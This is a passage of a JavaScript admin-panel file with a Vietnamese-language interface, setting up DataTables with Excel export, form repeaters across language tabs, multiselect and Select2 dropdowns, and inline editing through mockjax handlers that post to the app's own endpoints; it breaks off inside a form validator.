var TableDatatables = function() {
    var TableDefaults = function (options) {
        var table = $((options && options.tableId) ? options.tableId : '#datatable-default');

        var scrollY = window.innerHeight - 300;
        var minScrollY = 428;

        var defaults = {
            order: [],
            buttons: [],
            responsive: false,
            pagingType: 'bootstrap_full_number',
            pageLength: 20,
            lengthMenu: [
                [20, 50, 100, -1],
                [20, 50, 100, _HTTranslator('Tất cả')]
            ],
            columnDefs: [
                { className: 'dt-right' },
                { targets: 'nosort',  orderable: false },
                { targets: 'nosearch', searchable: false },
                { targets: 'colvis', visible: false }
            ],
            language: {
                emptyTable: _HTTranslator('Không có'),
                info: _HTTranslator('Hiển thị')+' _START_ '+_HTTranslator('đến')+' _END_ '+_HTTranslator('trong tổng số')+' _TOTAL_ '+_HTTranslator('mục'),
                infoEmpty: '',
                infoFiltered: '',
                lengthMenu: _HTTranslator('Hiển thị')+' _MENU_ '+_HTTranslator('dòng'),
                search: _HTTranslator('Tìm kiếm')+':',
                zeroRecords: _HTTranslator('Không tìm thấy'),
                aria: {
                    sortAscending: ': activate to sort column ascending',
                    sortDescending: ': activate to sort column descending'
                },
            },
            scrollY: scrollY > minScrollY ? scrollY : minScrollY,
            scrollX: false,
            scrollCollapse: true,
            dom: "<'row' <'col-md-12'B>><'row'<'col-md-3 col-sm-12'f><'col-md-3 col-sm-12 pull-right'l>r><'table-scrollable't><'row'<'col-md-5 col-sm-12'i><'col-md-7 col-sm-12'p>>", // horizobtal scrollable datatable
        };

        if (table.hasClass('colvis-column')) {
            if (options?.customize?.colvis) {
                defaults.buttons[0] = {
                    className: 'btn grey-salsa',
                    text: 'Tùy chỉnh cột',
                    action: function ( e, dt, button, config ) {
                        window.location = options.customize.colvis;
                    },
                }
            } else {
                defaults.buttons[0] = { extend: 'colvis', className: 'btn grey-salsa', text: _HTTranslator('Tùy chỉnh cột'), columns: ':gt(0)' };
            }
        }
        if (table.hasClass('excel-column')) {
            if (options?.customize?.excel) {
                defaults.buttons[1] = {
                    extend: 'collection',
                    className: 'btn yellow ',
                    text: _HTTranslator("Xuất excel"),
                    buttons: [
                        {
                            extend: 'excel',
                            title: '',
                            className: 'excel-item',
                            text: _HTTranslator("Theo cột hiển thị"),
                            exportOptions: { columns: ':visible:not(.noexcel)', modifier: { selected: true } },
                            action: function ( e, dt, node, config ) {
                                if (dt.rows( { selected: true } ).count() > 0) {
                                    $.fn.dataTable.ext.buttons.excelHtml5.action.call(this, e, dt, node, config);
                                } else {
                                    _HTTemplate.yesno('Vui lòng chọn danh sách để xuất file');
                                }
                            },
                            customize: function(xlsx){
                                var onTable = new $.fn.dataTable.Api(options.tableId);
                                var columns = Object.values(onTable.ajax.json().pureColumns).filter((column) => column.display && column.excel && column.colvis !== true);
                                var rows = Object.values(onTable.ajax.json().pureData);
                                _HTExport.excel(xlsx, _HTExport.formatExcel(options.tableId, columns, rows));
                            }
                        },
                        {
                            extend: 'excel',
                            title: '',
                            className: 'excel-item',
                            text: _HTTranslator("Tất cả trường dữ liệu"),
                            exportOptions: { columns: ':not(.noexcel)', modifier: { selected: true } },
                            action: function ( e, dt, node, config ) {
                                if (dt.rows( { selected: true } ).count() > 0) {
                                    $.fn.dataTable.ext.buttons.excelHtml5.action.call(this, e, dt, node, config);
                                } else {
                                    _HTTemplate.yesno('Vui lòng chọn danh sách để xuất file');
                                }
                            },
                            customize: function(xlsx){
                                var onTable = new $.fn.dataTable.Api(options.tableId);
                                var columns = Object.values(onTable.ajax.json().pureColumns).filter((column) => column.display && column.excel);
                                var rows = Object.values(onTable.ajax.json().pureData);
                                _HTExport.excel(xlsx, _HTExport.formatExcel(options.tableId, columns, rows));
                            }
                        },
                    ]
                }
            } else {
                defaults.buttons[1] = {
                    extend: 'collection',
                    className: 'btn yellow ',
                    text: _HTTranslator("Xuất excel"),
                    buttons: [
                        {
                            extend: 'excel',
                            title: '',
                            className: 'excel-item',
                            text: _HTTranslator("Theo cột hiển thị"),
                            exportOptions: { columns: ':visible:not(.noexcel)', modifier: { selected: true } },
                            action: function ( e, dt, node, config ) {
                                if (dt.rows( { selected: true } ).count() > 0) {
                                    $.fn.dataTable.ext.buttons.excelHtml5.action.call(this, e, dt, node, config);
                                } else {
                                    _HTTemplate.yesno('Vui lòng chọn danh sách để xuất file');
                                }
                            },
                        },
                        {
                            extend: 'excel',
                            title: '',
                            className: 'excel-item',
                            text: _HTTranslator("Tất cả trường dữ liệu"),
                            exportOptions: { columns: ':not(.noexcel)', modifier: { selected: true } },
                            action: function ( e, dt, node, config ) {
                                if (dt.rows( { selected: true } ).count() > 0) {
                                    $.fn.dataTable.ext.buttons.excelHtml5.action.call(this, e, dt, node, config);
                                } else {
                                    _HTTemplate.yesno('Vui lòng chọn danh sách để xuất file');
                                }
                            },
                        },
                    ]
                };
            }
        }
        if (table.hasClass('action-column')) {
            defaults.scrollX = true;
            defaults.fixedColumns = {
                leftColumns: 0,
                rightColumns: 1
            };
        }

        var onTable = table.dataTable($.extend({}, defaults, options));

        table.closest('.table-scrollable').on('change', '.group-checkable', function () {
            var checked = $(this).is(":checked");
            $(table.find($(this).data("set"))).each(function (index) {
                if (checked) {
                    onTable.api().row(':eq('+index+')', { page: 'current' }).select();
                    $(this).prop("checked", true);
                    $(this).parents('tr').addClass("active");
                } else {
                    onTable.api().row(':eq('+index+')', { page: 'current' }).deselect();
                    $(this).prop("checked", false);
                    $(this).parents('tr').removeClass("active");
                }
            });
        });

        table.on('change', 'tbody tr .ht-checkall-rows', function () {
            var trEl = $(this).parents('tr');
            trEl.toggleClass("active");
            if (trEl.hasClass('selected')) {
                onTable.api().row(':eq('+trEl.index()+')', { page: 'current' }).deselect();
            } else {
                onTable.api().row(':eq('+trEl.index()+')', { page: 'current' }).select();
            }
        });

        $('.tooltips').tooltip({
            trigger: 'hover',
            container: 'body',
        });
    };

    return {
        //main function to initiate the module
        init: function (options) {
            TableDefaults(options);
        },
    };
}();

var FormRepeater = function() {
    var changeAttrName = function(obj, type) {
        switch(type) {
            case 'define':
                obj.find('input[type="checkbox"]').each(function(i, el) {
                    setTimeout(function() {
                        var name = $(el).attr('name').replace(/\[]/g,'');
                        $(el).attr('name', name);
                        var editableEl = $(el).siblings('[data-container="editable-checkbox"]');
                        if (editableEl.length > 0) {
                            editableEl.attr('ht-trigger', name);
                            editableEl.attr('data-name', name);
                            FormEditable.textarea(name, {type: 'text', mode: 'inline', inputclass: 'form-control', clear: false, name: name});
                        }
                    },500);
                });
                var define = obj.find('[data-define]').data('define');
                if (define) {
                    obj.find('[data-define] input').each(function(i, el) {
                        setTimeout(function() {
                            name = $(el).closest('[data-repeater-list]').attr('data-repeater-list');
                            el_name = ($(el).attr('name').replace(/\[\d+]/g,'')).replace(name, '');
                            $(el).attr('name', $(el).attr('name').replace(el_name, '['+define+']'+el_name));
                        },500);
                    });
                }
                if (event.type == 'click') {
                    obj.find('[data-repeater-item] select').each(function() {
                        if ($(this).attr('multiple') == 'multiple') {
                            BootstrapMultiselect.init();
                        } else if ($(this)[0].classList.contains('select2')) {
                            $(this).siblings('.select2').remove();
                            $(this).select2(Select2.getOptions($(this)));
                        }
                    });
                    obj.find('[data-repeater-item] [error-checked-repeater]').each(function() {
                        var name = $(this).attr('name');
                        var els = $(this).closest('[data-repeater-item]').find('[name="' + name + '"]:checked');
                        if (els.length == 0) {
                            $(this).prop('checked', true);
                        }
                    });
                }
            break;
            case 'image':
                setTimeout(function() {
                    obj.find('input, textarea').each(function(i, el) {
                        var name = $(el).attr('name');
                        name = name.replace(/\[\]$/, '');
                        $(el).attr('name', name.replace(/\[\d+]([^\d+]+)$/, '$1')+'[]');
                    });
                },500);
            break;
            case 'file':
                obj.find('input').each(function(i, el) {
                    setTimeout(function() {
                        $(el).attr('name', $(el).attr('name').replace(/\[\d+]/g,'')+'[]');
                    },500);
                });
            break;
            case 'headline':
                obj.find('textarea').each(function(i, el) {
                    setTimeout(function() {
                        $(el).attr('name', $(el).attr('name').replace(/\[\d+]/g,'')+'[]');
                    },500);
                });
                obj.find(' > [data-repeater-create]').click(function(event) {
                    var tmp = parseInt(obj.find('[data-repeater-item]:nth-last-child(2) textarea[readonly="true"]').val().replace('slug-',''));
                    obj.find('[data-repeater-item]:last-child textarea[readonly="true"]').val('slug-'+(tmp+1));
                });
            break;
            case 'sub':
                setTimeout(function() {
                    obj.find('[data-repeater-create="image"]').each(function(index, el) {
                        $(el).siblings('[data-repeater-list]').find('input').each(function(i, input) {
                            if (/\[\]$/.test(this.name) === false) {
                                $(input).attr('name', this.name.replace(/\[\d+]([^\d+]+)$/, '$1')+'[]');
                            }
                        });
                    });
                    if (obj.find('[data-translate]').attr('data-translate')) {
                        obj.find('[data-translate]').each(function(i, el) {
                            name = $(el).closest('[data-repeater-list]').attr('data-repeater-list');
                            el_name = ($(el).attr('name').replace(/\[\d+]/g,'')).replace(name, '');
                            $(el).attr('name', $(el).attr('name').replace(el_name, '[translate]['+$(el).attr('data-translate')+']'+el_name));
                        });
                    }
                }, 500);
                if (event.type == 'click') {
                    obj.find('[data-repeater-item] select').each(function() {
                        if ($(this).attr('multiple') == 'multiple') {
                            BootstrapMultiselect.init();
                        } else {
                            $(this).siblings('.select2').remove();
                            $(this).select2({
                                placeholder: _HTTranslator('Vui lòng chọn'),
                                theme: 'bootstrap',
                                width: null
                            });
                        }
                    });

                    setTimeout(function() {
                        obj.find('[data-repeater-item] .ckeditor-sub').each(function() {
                            try {
                                if ($(this).data('size')) {
                                    CKEDITOR.replace(this.name, _HTTemplate.editor($(this).data('size')));
                                } else {
                                    CKEDITOR.replace(this.name);
                                }
                            } catch (e) {}
                        });

                        setTimeout(function() {
                            if (obj.innerHeight() == parseInt(obj[0].style.maxHeight)) {
                                obj.animate({"scrollTop": (obj[0].scrollHeight - obj.find('[data-repeater-item]:last').height() - 10)},300);
                            }
                        }, 300);
                    }, 500);
                }
            break;
        }
    };

    return {
        init: function () {
            $('.mt-repeater').each(function(i, el) {
                if (!$(el).hasClass('inner-repeater')) {
                    $(this).repeater({
                        initEmpty: true,
                        repeaters : [{
                            selector : '.inner-repeater:not([inner])',
                            show : function() {
                                $(this).slideDown();
                                var type = $(this).closest('[data-repeater-list]').siblings('[data-repeater-create]').attr('data-repeater-create');
                                if (['sub-input'].includes(type)) {
                                    var child = $(this).closest('[data-repeater-list]');
                                    var parent = child.closest('[data-repeater-item]');
                                    var repeater_child = child.data('repeater-list');
                                    var repeater_parent = child.closest('.mt-repeater__list-croll').data('repeater-list');
                                    var langActive = $(this).closest('.tab-pane').attr('id').replace('tab_', '');
                                    var tab = $(this).closest('.tab-pane').next();
                                    if (tab.length > 0) {
                                        var lang = tab.attr('id').replace('tab_', '');
                                        var item_parent = tab.find('[data-repeater-list="'+(repeater_parent.replace(`[${langActive}]`, `[${lang}]`))+'"]').find('> [data-repeater-item]')[parent.index()];
                                        $(item_parent).find('[data-repeater-list="'+(repeater_child.replace(`[${langActive}]`, `[${lang}]`))+'"]').next().click();
                                    }
                                }
                                if (type) {
                                    changeAttrName($(this).closest('[data-repeater-list]'), type);
                                }
                            },
                            hide: function (remove) {
                                $(this).slideUp(remove);
                                var type = $(this).closest('[data-repeater-list]').siblings('[data-repeater-create]').attr('data-repeater-create');
                                if (['sub-input'].includes(type)) {
                                    var child = $(this).closest('[data-repeater-list]');
                                    var parent = child.closest('[data-repeater-item]');
                                    var repeater_child = child.data('repeater-list');
                                    var repeater_parent = child.closest('.mt-repeater__list-croll').data('repeater-list');
                                    var langActive = $(this).closest('.tab-pane').attr('id').replace('tab_', '');
                                    var tab = $(this).closest('.tab-pane').next();
                                    if (tab.length > 0) {
                                        var lang = tab.attr('id').replace('tab_', '');
                                        var item_parent = tab.find('[data-repeater-list="'+(repeater_parent.replace(`[${langActive}]`, `[${lang}]`))+'"]').find('> [data-repeater-item]')[parent.index()];
                                        var item_child = $(item_parent).find('[data-repeater-list="'+(repeater_child.replace(`[${langActive}]`, `[${lang}]`))+'"]').find('> [data-repeater-item]')[child.index()];
                                        $(item_child).find('> .mt-repeater-item [data-repeater-delete]').click();
                                    }
                                }
                                if (type) {
                                    changeAttrName($(this).closest('[data-repeater-list]'), type);
                                }
                            },
                        }, {
                            selector : '.inner-repeater[inner="image"]',
                            show : function() {
                                $(this).slideDown();
                                var type = $(this).closest('[data-repeater-list]').siblings('[data-repeater-create]').attr('data-repeater-create');
                                var child = $(this).closest('[data-repeater-list]');
                                var parent = child.closest('[data-repeater-item]');
                                var repeater_child = child.data('repeater-list');
                                var repeater_parent = child.closest('.mt-repeater__list-croll').data('repeater-list');
                                var langActive = $(this).closest('.tab-pane').attr('id').replace('tab_', '');
                                var tab = $(this).closest('.tab-pane').next();
                                if (tab.length > 0) {
                                    var lang = tab.attr('id').replace('tab_', '');
                                    var item_parent = tab.find('[data-repeater-list="'+(repeater_parent.replace(`[${langActive}]`, `[${lang}]`))+'"]').find('> [data-repeater-item]')[parent.index()];
                                    $(item_parent).find('[data-repeater-list="'+(repeater_child.replace(`[${langActive}]`, `[${lang}]`))+'"]').next('.hidden').click();
                                }
                                if (type) {
                                    changeAttrName($(this).closest('[data-repeater-list]'), type);
                                }
                            },
                            hide: function (remove) {
                                $(this).slideUp(remove);
                                var type = $(this).closest('[data-repeater-list]').siblings('[data-repeater-create]').attr('data-repeater-create');
                                var child = $(this).closest('[data-repeater-list]');
                                var parent = child.closest('[data-repeater-item]');
                                var repeater_child = child.data('repeater-list');
                                var repeater_parent = child.closest('.mt-repeater__list-croll').data('repeater-list');
                                var langActive = $(this).closest('.tab-pane').attr('id').replace('tab_', '');
                                var tab = $(this).closest('.tab-pane').next();
                                if (tab.length > 0) {
                                    var lang = tab.attr('id').replace('tab_', '');
                                    var item_parent = tab.find('[data-repeater-list="'+(repeater_parent.replace(`[${langActive}]`, `[${lang}]`))+'"]').find('> [data-repeater-item]')[parent.index()];
                                    var item_child = $(item_parent).find('[data-repeater-list="'+(repeater_child.replace(`[${langActive}]`, `[${lang}]`))+'"]').find('> [data-repeater-item]')[child.index()];
                                    $(item_child).find('> .mt-repeater-item .hidden[data-repeater-delete]').click();
                                }
                                if (type) {
                                    changeAttrName($(this).closest('[data-repeater-list]'), type);
                                }
                            },
                        }],
                        show: function () {
                            $(this).slideDown();
                            DateTimePickers.init();
                            var type = $(el).find('> [data-repeater-create]').attr('data-repeater-create');
                            if (['input','image','sub'].includes(type)) {
                                var repeater = $(this).closest('[data-repeater-list]').data('repeater-list');
                                var langActive = $(this).closest('.tab-pane').attr('id').replace('tab_', '');
                                var tab = $(this).closest('.tab-pane').next();
                                if (tab.length > 0) {
                                    var lang = tab.attr('id').replace('tab_', '');
                                    tab.find('[data-repeater-list="'+(repeater.replace(`[${langActive}]`, `[${lang}]`))+'"]').next('.hidden').click();
                                }
                            }
                            if (type == 'ht-editor') {
                                var match = $(this).closest('[data-repeater-list]').data('repeater-list').match(/[^\[]+(?=\])/g);
                                var classTxt = match[0] + ((match[2]) ? '-'+match[2] : '') + '-' + $(this).index();
                                $(this).find('textarea').addClass(classTxt);
                                try {
                                    CKEDITOR.replaceAll(function (textarea, config) {
                                        if ($(textarea).hasClass(classTxt)) {
                                            if ($(textarea).data('size') === 'mini') {
                                                config = Object.assign(config, _HTTemplate.editor($(textarea).data('size')));
                                            }
                                            return true;
                                        }

                                        return false;
                                    });
                                } catch {}
                            }
                            if (type) {
                                changeAttrName($(this).closest('[data-repeater-list]'), type);
                            }
                        },
                        hide: function (remove) {
                            var type = $(this).closest('.mt-repeater').find('> [data-repeater-create]').attr('data-repeater-create');
                            if (['input','image','sub'].includes(type)) {
                                var repeater = $(this).closest('[data-repeater-list]').data('repeater-list');
                                var langActive = $(this).closest('.tab-pane').attr('id').replace('tab_', '');
                                var index = $(this).index();
                                var tab = $(this).closest('.tab-pane').next();
                                if (tab.length > 0) {
                                    var lang = tab.attr('id').replace('tab_', '');
                                    var item = tab.find('[data-repeater-list="'+(repeater.replace(`[${langActive}]`, `[${lang}]`))+'"]').find('> [data-repeater-item]')[index];
                                    $(item).find('> .mt-repeater-item .hidden[data-repeater-delete]').click();
                                }
                            }
                            if (type == 'ht-editor') {
                                $(this).slideUp();
                                $(this).find('input').attr('disabled', true);
                                $(this).find('textarea').attr('disabled', true);
                            } else if (type == 'image') {
                                $(this).slideUp();
                                var disabled = $(this).find('[disabled]');
                                $(this).find('input, textarea').attr('disabled', true);
                                disabled.removeAttr('disabled');
                            } else {
                                $(this).slideUp(remove);
                            }
                            if (type && type != 'image') {
                                changeAttrName($(this).closest('[data-repeater-list]'), type);
                            }
                        },
                        ready: function (setIndexes) {
                        }
                    });
                    var type = $(el).find(' > [data-repeater-create]').attr('data-repeater-create');
                    if (type) {
                        changeAttrName($(el), type);
                    }
                }
            });
            try {
                CKEDITOR.replaceAll(function (textarea, config) {
                    if ($(textarea).hasClass('ckeditor-sub') && $(textarea).closest('[data-repeater-item]').index() > 0) {
                        if ($(textarea).data('size') == 'mini') {
                            config = Object.assign(config, _HTTemplate.editor($(textarea).data('size')));
                        }
                        return true;
                    }

                    return false;
                });
            } catch {}
        },
    };
}();

var BootstrapMultiselect = function() {
    return {
        init: function () {
            $('.mt-multiselect').each(function(){
                if ($(this).parent()[0].localName == 'span') {
                    $(this).closest('div').html($(this));
                }
                var btn_class = $(this).attr('class');
                var clickable_groups = ($(this).data('clickable-groups')) ? $(this).data('clickable-groups') : false ;
                var collapse_groups = ($(this).data('collapse-groups')) ? $(this).data('collapse-groups') : false ;
                var drop_right = ($(this).data('drop-right')) ? $(this).data('drop-right') : false ;
                var drop_up = ($(this).data('drop-up')) ? $(this).data('drop-up') : false ;
                var select_all = ($(this).data('select-all') == false) ? $(this).data('select-all') : true ;
                var width = ($(this).data('width')) ? $(this).data('width') : '100%' ;
                var height = ($(this).data('height')) ? $(this).data('height') : '' ;
                var filter = ($(this).data('filter') == false) ? $(this).data('filter') : true ;

                // advanced functions
                var onchange_function = function(option, checked, select) {
                    // alert('Changed option ' + $(option).val() + '.');
                };
                var dropdownshow_function = function(event) {
                    // alert('Dropdown shown.');
                };
                var dropdownhide_function = function(event) {
                    // alert('Dropdown Hidden.');
                };

                // init advanced functions
                var onchange = ($(this).data('action-onchange') == undefined) ? onchange_function : '';
                var dropdownshow = ($(this).data('action-dropdownshow') == true) ? dropdownshow_function : '';
                var dropdownhide = ($(this).data('action-dropdownhide') == true) ? dropdownhide_function : '';

                // template functions
                // init variables
                var li_template;
                if ($(this).attr('multiple')){
                    li_template = '<li class="mt-checkbox-list"><a href="javascript:void(0);"><label class="mt-checkbox"> <span></span></label></a></li>';
                } else {
                    li_template = '<li><a href="javascript:void(0);"><label></label></a></li>';
                }

                // init multiselect
                $(this).multiselect({
                    enableClickableOptGroups: clickable_groups,
                    enableCollapsibleOptGroups: collapse_groups,
                    disableIfEmpty: true,
                    enableFiltering: filter,
                    includeSelectAllOption: select_all,
                    dropRight: drop_right,
                    buttonWidth: width,
                    maxHeight: height,
                    onChange: onchange,
                    onDropdownShow: dropdownshow,
                    onDropdownHide: dropdownhide,
                    buttonClass: btn_class,
                    selectAllText: _HTTranslator('Chọn tất cả'),
                    filterPlaceholder: _HTTranslator('Tìm từ khóa'),
                    nonSelectedText: _HTTranslator('Vui lòng chọn'),
                    nSelectedText: _HTTranslator('đã chọn'),
                    allSelectedText: _HTTranslator('Đã chọn tất cả'),
                    templates: {
                        ul: '<ul class="multiselect-container dropdown-menu multiselect-mt-checkbox"></ul>',
                    }
                });

                if ($(this).parent()[0].localName == 'span') {
                    $('.multiselect-container li:not(.multiselect-filter)').find('label').addClass('mt-checkbox mt-checkbox-outline');
                    $('.multiselect-container li:not(.multiselect-filter)').find('input').addClass('group-checkable');
                    $('.multiselect-container li:not(.multiselect-filter)').find('input').after('<span></span>');
                }
            });
        },
        item: function (obj) {
            var $this = $('#'+obj).find('.mt-multiselect');
            if ($this.length <= 0) return;

            if ($this.parent()[0].localName == 'span') {
                $this.closest('div').html($this);
            }
            var btn_class = $this.attr('class');
            var clickable_groups = ($this.data('clickable-groups')) ? $this.data('clickable-groups') : false ;
            var collapse_groups = ($this.data('collapse-groups')) ? $this.data('collapse-groups') : false ;
            var drop_right = ($this.data('drop-right')) ? $this.data('drop-right') : false ;
            var drop_up = ($this.data('drop-up')) ? $this.data('drop-up') : false ;
            var select_all = ($this.data('select-all') == false) ? $this.data('select-all') : true ;
            var width = ($this.data('width')) ? $this.data('width') : '100%' ;
            var height = ($this.data('height')) ? $this.data('height') : '' ;
            var filter = ($this.data('filter') == false) ? $this.data('filter') : true ;

            // advanced functions
            var onchange_function = function(option, checked, select) {
                // alert('Changed option ' + $(option).val() + '.');
            };
            var dropdownshow_function = function(event) {
                // alert('Dropdown shown.');
            };
            var dropdownhide_function = function(event) {
                // alert('Dropdown Hidden.');
            };

            // init advanced functions
            var onchange = ($this.data('action-onchange') == undefined) ? onchange_function : '';
            var dropdownshow = ($this.data('action-dropdownshow') == true) ? dropdownshow_function : '';
            var dropdownhide = ($this.data('action-dropdownhide') == true) ? dropdownhide_function : '';

            // template functions
            // init variables
            var li_template;
            if ($this.attr('multiple')){
                li_template = '<li class="mt-checkbox-list"><a href="javascript:void(0);"><label class="mt-checkbox"> <span></span></label></a></li>';
            } else {
                li_template = '<li><a href="javascript:void(0);"><label></label></a></li>';
            }

            // init multiselect
            $this.multiselect({
                enableClickableOptGroups: clickable_groups,
                enableCollapsibleOptGroups: collapse_groups,
                disableIfEmpty: true,
                enableFiltering: filter,
                includeSelectAllOption: select_all,
                dropRight: drop_right,
                buttonWidth: width,
                maxHeight: height,
                onChange: onchange,
                onDropdownShow: dropdownshow,
                onDropdownHide: dropdownhide,
                buttonClass: btn_class,
                selectAllText: _HTTranslator('Chọn tất cả'),
                filterPlaceholder: _HTTranslator('Tìm từ khóa'),
                nonSelectedText: _HTTranslator('Vui lòng chọn'),
                nSelectedText: _HTTranslator('đã chọn'),
                allSelectedText: _HTTranslator('Đã chọn tất cả'),
                templates: {
                    ul: '<ul class="multiselect-container dropdown-menu multiselect-mt-checkbox"></ul>',
                }
            });

            if ($this.parent()[0].localName == 'span') {
                $('.multiselect-container li:not(.multiselect-filter)').find('label').addClass('mt-checkbox mt-checkbox-outline');
                $('.multiselect-container li:not(.multiselect-filter)').find('input').addClass('group-checkable');
                $('.multiselect-container li:not(.multiselect-filter)').find('input').after('<span></span>');
            }
        },
    };
}();

var Select2 = function() {

    var getOptions = function(obj) {
        var classList = Array.from(obj[0].classList);

        return {
            placeholder: obj.attr('placeholder') || _HTTranslator('Vui lòng chọn'),
            minimumResultsForSearch: classList.includes('select2-not-search') ? Infinity : 0,
            allowClear: classList.includes('select2-multiple'),
            language: {
                noResults: function() {
                    return _HTTranslator('Không tìm thấy kết quả');
                },
            },
        }
    }

    return {
        init: function() {
            $.fn.select2.defaults.set("theme", "bootstrap");
            $.fn.select2.defaults.set("width", "null");

            $('.select2').each(function(){
                const options = getOptions($(this));
                $(this).select2(options);
            });

            $("button[data-select2-open]").click(function() {
                $("#" + $(this).data("select2-open")).select2("open");
            });

            $(":checkbox").on("click", function() {
                $(this).parent().nextAll("select").prop("disabled", !this.checked);
            });
        },
        item: function(obj) {
            var $this = $('#'+obj).find('.select2');
            if ($this.length <= 0) return;

            var placeholder = $('.select2, .select2-not-search, .select2-multiple').attr('placeholder');
            placeholder = (placeholder) ? placeholder : _HTTranslator('Vui lòng chọn');

            $.fn.select2.defaults.set("theme", "bootstrap");
            $.fn.select2.defaults.set("width", "null");
            $.fn.select2.defaults.set("placeholder", placeholder);

            $this.select2();
        },
        getOptions: function(obj) {
            return getOptions(obj);
        }
    };
}();

var FormEditable = function() {
    $.mockjaxSettings.responseTime = 500;
    var log = function(settings, response) {
        var s = [], str;
        s.push(settings.type.toUpperCase() + ' url = "' + settings.url + '"');
        for (var a in settings.data) {
            if (settings.data[a] && typeof settings.data[a] === 'object') {
                str = [];
                for (var j in settings.data[a]) {
                    str.push(j + ': "' + settings.data[a][j] + '"');
                }
                str = '{ ' + str.join(', ') + ' }';
            } else {
                str = '"' + settings.data[a] + '"';
            }
            s.push(a + ' = ' + str);
        }
        s.push('RESPONSE: status = ' + response.status);

        if (response.responseText) {
            if ($.isArray(response.responseText)) {
                s.push('[');
                $.each(response.responseText, function(i, v) {
                    s.push('{value: ' + v.value + ', text: "' + v.text + '"}');
                });
                s.push(']');
            } else {
                s.push($.trim(response.responseText));
            }
        }
        s.push('--------------------------------------\n');
        $('#console').val(s.join('\n') + $('#console').val());
    };

    return {
        group: function(trigger, options) {
            $('[ht-trigger="'+trigger+'"]').editable(
                $.extend({
                    showbuttons: false,
                    inputclass: 'form-control',
                    type: 'select',
                    title: _HTTranslator('Trạng thái'),
                    url: '/post-'+trigger,
                    source: '/groups-'+trigger,
                    emptytext: _HTTranslator('Vui lòng chọn'),
                }, options)
            );

            $.mockjax({
                url: '/groups-'+trigger,
                log: '',
                response: function(settings) {
                    this.responseText = options.responseText;
                }
            });

            $.mockjax({
                url: '/post-'+trigger,
                log: '',
                response: function(settings) {
                    var params = {
                        url: settings.data.pk
                    };
                    params[settings.data.name] = settings.data.value;
                    _HTChange.status(this, 'editable', params);
                }
            });
        },
        checklist: function(trigger, options) {
            $('[ht-trigger="'+trigger+'"]').editable(
                $.extend({
                    url: '/post-'+trigger,
                    type: 'checklist',
                    unsavedclass: '',
                    emptytext: _HTTranslator('Vui lòng chọn'),
                    display: function(value, sourceData) {
                        var html = [],
                        checked = $.fn.editableutils.itemsByValue(value, sourceData);

                        if(checked.length) {
                            $.each(checked, function(i, v) { html.push($.fn.editableutils.escape(v.text)); });
                            $(this).html(html.join(', '));
                        } else {
                            $(this).empty();
                        }
                    }
                }, options)
            );

            $('[ht-trigger="'+trigger+'"]').on('shown', function(e, reason) {});

            $.mockjax({
                url: '/post-'+trigger,
                log: '',
                response: function(settings) {
                    var params = {
                        url: settings.data.pk
                    };
                    params[settings.data.name] = settings.data.value;
                    _HTChange.status(this, 'editable', params);
                }
            });
        },
        datetime: function(trigger, options) {
            $('[ht-trigger="'+trigger+'"]').editable(
                $.extend({
                    type: 'datetime',
                    url: '/post-'+trigger,
                    format: 'yyyy-mm-dd hh:ii',
                    viewformat: 'hh:ii dd/mm/yyyy',
                    datetimepicker: {
                        language: BE_LANG,
                        todayBtn: false,
                        minuteStep: 1
                    }
                }, options)
            );
            $.mockjax({
                url: '/post-'+trigger,
                log: '',
                response: function(settings) {
                    var params = {
                        url: settings.data.pk
                    };
                    params[settings.data.name] = (settings.data.value) ? settings.data.value : 0;
                    _HTChange.status(this, 'editable', params);
                }
            });
        },
        textarea: function(trigger, options) {
            $('[ht-trigger="'+trigger+'"]').editable(
                $.extend({
                    type: 'textarea',
                    url: '/post-'+trigger,
                    showbuttons: 'bottom'
                }, options)
            );
            $.mockjax({
                url: '/post-'+trigger,
                log: '',
                response: function(settings) {
                    var params = {};
                    params[settings.data.name] = settings.data.value;
                    if (settings.data.pk === 'input') {
                        $('input[name="'+settings.data.name+'"]').val(settings.data.value);
                    } else {
                        $.ajax({
                            url: settings.data.pk,
                            type: 'post',
                            data: params,
                        });
                    }
                }
            });
        },
        price: function(trigger, options) {
            var unit = options?.unit || '';
            $('[ht-trigger="'+trigger+'"]').editable(
                $.extend({
                    type: 'text',
                    url: '/post-'+trigger,
                    showbuttons: 'bottom',
                    display: function(value, sourceData) {
                        $(this).html(value > 0 ? _HTFormat.money(value, unit) : '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;');
                    },
                    validate: function(value) {
                        var priceMarketEl = $(this).closest('tr').find('[data-name="price_market"]');
                        var priceDiscountEl = $(this).closest('tr').find('[data-name="price_discount"]');
                        var pk = ($(this).data('name') == 'price_market') ? priceDiscountEl.data('pk') : priceMarketEl.data('pk');

                        var priceMarket = _HTFormat.number(priceMarketEl.text(), unit);
                        var priceDiscount = _HTFormat.number(priceDiscountEl.text(), unit);
                        var priceActual = _HTFormat.number(value, unit);

                        if ($(this).data('name') == 'price_market') {
                            priceMarket = priceActual;
                            pk.price_market = priceMarket || 0;
                            priceDiscountEl.attr('data-pk', JSON.stringify(pk));
                            if (priceMarket < priceDiscount) {
                                return $(this).data('title')+' phải lớn hơn '+priceDiscountEl.data('title');
                            }
                        } else {
                            priceDiscount = priceActual;
                            pk.price_discount = priceDiscount || 0;
                            priceMarketEl.attr('data-pk', JSON.stringify(pk));
                            if (priceMarket < priceDiscount) {
                                return $(this).data('title')+' phải nhỏ hơn '+priceMarketEl.data('title');
                            }
                        }
                    }
                }, options)
            );
            $.mockjax({
                url: '/post-'+trigger,
                log: '',
                response: function(settings) {
                    var value = _HTFormat.number(settings.data.value, unit);
                    var priceDiscount = _HTFormat.number(settings.data.pk.price_discount, unit);
                    var priceMarket = _HTFormat.number(settings.data.pk.price_market, unit);

                    var pricePercent = 0;
                    if (value > 0) {
                        if (priceDiscount) {
                            pricePercent = Math.floor(100 - ((priceDiscount * 100) / value));
                        } else if (priceMarket) {
                            pricePercent = Math.floor(100 - ((value * 100) / priceMarket));
                        }
                    }

                    $.ajax({
                        url: settings.data.pk.url,
                        type: 'post',
                        data: {
                            price_percent: pricePercent,
                            [settings.data.name]: value
                        },
                    });
                }
            });
        }
    };
}();

var FormValidation = function() {
    $.validator.addMethod("pw", function (value, element) {
        if (/^(?=.*[!@#$&*]).{8,20}$/.test(value) || !value) {
            return true;
        } else {
            return false;
        }
    }, _HTTranslator("Mật khẩu phải có từ 8 - 20 ký tự, ít nhất có 1 ký tự đặc biệt !@#$&*"));

    $.validator.addMethod("exists", function (value, element, params) {
        var flag, data = params.condition;
        data[$(element).attr('name')] = value;
        $.ajax({
            url: params.url,
            type: 'POST',
            async: false,
            data: data,
        })
